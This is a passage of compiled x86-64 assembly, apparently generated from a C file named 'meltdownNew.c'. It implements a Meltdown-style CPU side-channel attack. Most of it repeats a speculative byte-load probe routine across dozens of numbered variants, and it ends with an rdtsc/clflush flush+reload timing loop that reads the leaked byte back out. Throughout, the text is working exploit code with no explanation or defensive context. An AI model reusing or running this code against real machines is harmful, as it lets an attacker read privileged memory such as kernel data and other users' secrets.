	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 418
.Lprobe_one_win0_var418:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 419
.Lprobe_one_win0_var419:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 420
.Lprobe_one_win0_var420:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 421
.Lprobe_one_win0_var421:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 422
.Lprobe_one_win0_var422:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 423
.Lprobe_one_win0_var423:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 424
.Lprobe_one_win0_var424:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 425
.Lprobe_one_win0_var425:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 426
.Lprobe_one_win0_var426:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 427
.Lprobe_one_win0_var427:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 428
.Lprobe_one_win0_var428:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 429
.Lprobe_one_win0_var429:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 430
.Lprobe_one_win0_var430:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 431
.Lprobe_one_win0_var431:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 432
.Lprobe_one_win0_var432:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 433
.Lprobe_one_win0_var433:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 434
.Lprobe_one_win0_var434:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 435
.Lprobe_one_win0_var435:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 436
.Lprobe_one_win0_var436:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 437
.Lprobe_one_win0_var437:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 438
.Lprobe_one_win0_var438:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 439
.Lprobe_one_win0_var439:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 440
.Lprobe_one_win0_var440:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 441
.Lprobe_one_win0_var441:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 442
.Lprobe_one_win0_var442:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 443
.Lprobe_one_win0_var443:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 444
.Lprobe_one_win0_var444:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 445
.Lprobe_one_win0_var445:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 446
.Lprobe_one_win0_var446:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 447
.Lprobe_one_win0_var447:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 448
.Lprobe_one_win0_var448:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 449
.Lprobe_one_win0_var449:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 450
.Lprobe_one_win0_var450:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 451
.Lprobe_one_win0_var451:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 452
.Lprobe_one_win0_var452:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 453
.Lprobe_one_win0_var453:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 454
.Lprobe_one_win0_var454:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 455
.Lprobe_one_win0_var455:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 456
.Lprobe_one_win0_var456:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 457
.Lprobe_one_win0_var457:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 458
.Lprobe_one_win0_var458:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 459
.Lprobe_one_win0_var459:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 460
.Lprobe_one_win0_var460:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 461
.Lprobe_one_win0_var461:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 462
.Lprobe_one_win0_var462:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 463
.Lprobe_one_win0_var463:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 464
.Lprobe_one_win0_var464:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 465
.Lprobe_one_win0_var465:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 466
.Lprobe_one_win0_var466:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 467
.Lprobe_one_win0_var467:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 468
.Lprobe_one_win0_var468:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 469
.Lprobe_one_win0_var469:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 470
.Lprobe_one_win0_var470:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 471
.Lprobe_one_win0_var471:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 472
.Lprobe_one_win0_var472:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 473
.Lprobe_one_win0_var473:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 474
.Lprobe_one_win0_var474:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 475
.Lprobe_one_win0_var475:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 476
.Lprobe_one_win0_var476:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 477
.Lprobe_one_win0_var477:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 478
.Lprobe_one_win0_var478:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 479
.Lprobe_one_win0_var479:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 480
.Lprobe_one_win0_var480:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 481
.Lprobe_one_win0_var481:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 482
.Lprobe_one_win0_var482:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 483
.Lprobe_one_win0_var483:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 484
.Lprobe_one_win0_var484:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 485
.Lprobe_one_win0_var485:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 486
.Lprobe_one_win0_var486:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 487
.Lprobe_one_win0_var487:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 488
.Lprobe_one_win0_var488:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 489
.Lprobe_one_win0_var489:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 490
.Lprobe_one_win0_var490:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 491
.Lprobe_one_win0_var491:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 492
.Lprobe_one_win0_var492:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 493
.Lprobe_one_win0_var493:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 494
.Lprobe_one_win0_var494:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 495
.Lprobe_one_win0_var495:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 496
.Lprobe_one_win0_var496:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 497
.Lprobe_one_win0_var497:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 498
.Lprobe_one_win0_var498:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
## Variant 499
.Lprobe_one_win0_var499:
	popq	%rax
	addq	$32, %rsp
	leaq	__gg_meltdown_sandbox(%rip), %r10
	testq	%rdx, %rdx
	cmovs	%r10, %rdx
	movb	(%rdx), %al
	shlq	$0xc, %rax
	jz	92b
	movq	(%rcx, %rax, 1), %rbx
	jmp	.Lprobe_one_win0_continue
.Lprobe_one_win0_continue:
__speculative_byte_load_exit:
	nop
# 0 "" 2
#NO_APP
	movl	$0, -2388(%rbp)
	jmp	.L6
.L8:
	movl	-2388(%rbp), %eax
	imull	-2420(%rbp), %eax
	movslq	%eax, %rdx
	movq	-2416(%rbp), %rax
	addq	%rdx, %rax
	movq	%rax, -2344(%rbp)
	movq	-2344(%rbp), %rax
	movq	%rax, %rcx
#APP
# 118 "meltdownNew.c" 1
	mfence
	lfence
	rdtsc
	lfence
	movl	%eax, %esi
	movl	(%rcx), %eax
	lfence
	rdtsc
	subl	%esi, %eax
	clflush	0(%rcx)
# 0 "" 2
#NO_APP
	movq	%rax, -2368(%rbp)
	movq	-2368(%rbp), %rdx
	movl	-2388(%rbp), %eax
	cltq
	movq	%rdx, -2336(%rbp,%rax,8)
	addl	$1, -2388(%rbp)
.L6:
	cmpl	$255, -2388(%rbp)
	jle	.L8
	movl	$0, -2388(%rbp)
	jmp	.L9
.L12:
	movl	-2384(%rbp), %eax
	cltq
	movq	-2336(%rbp,%rax,8), %rax
	movl	-2388(%rbp), %edx
	movslq	%edx, %rdx
